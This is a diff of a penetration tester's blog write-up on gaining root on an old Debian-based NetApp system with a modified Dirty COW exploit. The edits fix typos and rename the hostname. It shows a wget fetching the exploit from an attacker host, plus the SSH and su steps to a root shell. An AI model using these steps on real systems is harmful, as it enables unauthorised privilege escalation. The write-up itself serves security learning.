@@ -28,15 +28,15 @@ While doing some enumeration, uname came back with the following:
 ```
 Debian 3.2.68-1+deb7u1
 ```
-Ripe for Dirty COW! The Dirty COW explot I'm most familiar with is [Firefart's exploit](https://github.com/FireFart/dirtycow.git). It's stable and it works. I ran the explot and it created the firefart user with no issues, but this is where it got interesting.
+Ripe for Dirty COW! The Dirty COW exploit I'm most familiar with is [Firefart's exploit](https://github.com/FireFart/dirtycow.git). It's stable and it works. I ran the exploit and it created the firefart user with no issues, but this is where it got interesting.
 
-Typical "firefartage" one does ```su - firefart``` or ssh firefart@<ip>. However, I could not upgrade my shell to a TTY shell (I'm sure I'm saying that wrong...). I could not ```su -``` since I didn't have a "real" terminal. I tried all the usual tricks (e.g. [Pentest Monkey's awesomeness](http://pentestmonkey.net/blog/post-exploitation-without-a-tty) and [Ropnop's great blog](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)) but not even stackoverflow could help me out! 
+Typical "firefartage" one does ```su - firefart``` or ssh firefart@<ip>. However, I could not upgrade my shell to a TTY shell (I'm sure I'm saying that wrong...). I could not ```su -``` since I didn't have a "real" terminal. I tried all the usual tricks (e.g. [Pentest Monkey's awesomeness] (http://pentestmonkey.net/blog/post-exploitation-without-a-tty) and [Ropnop's great blog] (https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)) but not even stackoverflow could help me out! 
   
-SSH was also a bust. The ssh server on the system was set up so only members of the maintenance group could log in and it could not be a root user. I decided to modify Firefart's code and make the firefart user an non-root user and add them to the maintenace group. I ran the exploit and it created the user! I was now able to ssh into the device. I was still not root, though. So, I ran the original exploit again thinking I could then just '''su - firefart'''. When I tried that, it failed with an error: ```I have no name!``` 
+SSH was also a bust. The ssh server on the system was set up so only members of the maintenance group could log in and it could not be a root user. I decided to modify Firefart's code and make the firefart user an non-root user and add them to the maintenace group. I ran the exploit and it created the user! I was now able to ssh into the device. I was still not root, though. So, I ran the original exploit again thinking I could then just ```su - firefart```. When I tried that, it failed with an error: ```I have no name!``` 
 
 Even, running the script twice with two different usernames ended in the same error. I decided I needed to modify the exploit code again to add both users at the same time. You can grab the modified code I lovingly named doubledirty [here](https://github.com/jreppiks/doubledirty.git) Please be kind, I am not a developer, but it complied and ran on the very first time, that has to count for something, right?!
 
-I grabbed the new explot code and ran it on the system:
+I grabbed the new exploit code and ran it on the system:
 ```
 jboss@netapp:/tmp$ wget 192.168.3.230:8080/doubledirty
 wget 192.168.3.230:8080/doubledirty
@@ -71,15 +71,15 @@ I was able to ssh in as the non-priveledged user and then su - to the root user!
 ```
 # ssh jreppiks@10.10.193.110
 Password: 
-Linux ihccopm 3.2.0-4-amd64 #1 SMP Debian 3.2.68-1+deb7u1 x86_64
+Linux netapp 3.2.0-4-amd64 #1 SMP Debian 3.2.68-1+deb7u1 x86_64
 Last login: Fri Aug 16 11:48:49 2019 from 192.168.3.230
 Could not chdir to home directory /root: Permission denied
 -bash: /root/.bash_profile: Permission denied
-jreppiks@ihccopm:/$ id
+jreppiks@netapp:/$ id
 uid=14(jreppiks) gid=1000(maintenance) groups=1000(maintenance)
-jreppiks@ihccopm:/$ su - jreppiksroot
+jreppiks@netapp:/$ su - jreppiksroot
 Password: 
-jreppiksroot@ihccopm:~# id
+jreppiksroot@netapp:~# id
 uid=0(jreppiksroot) gid=0(root) groups=0(root)
-jreppiksroot@ihccopm:~# 
+jreppiksroot@netapp:~# 
 ```
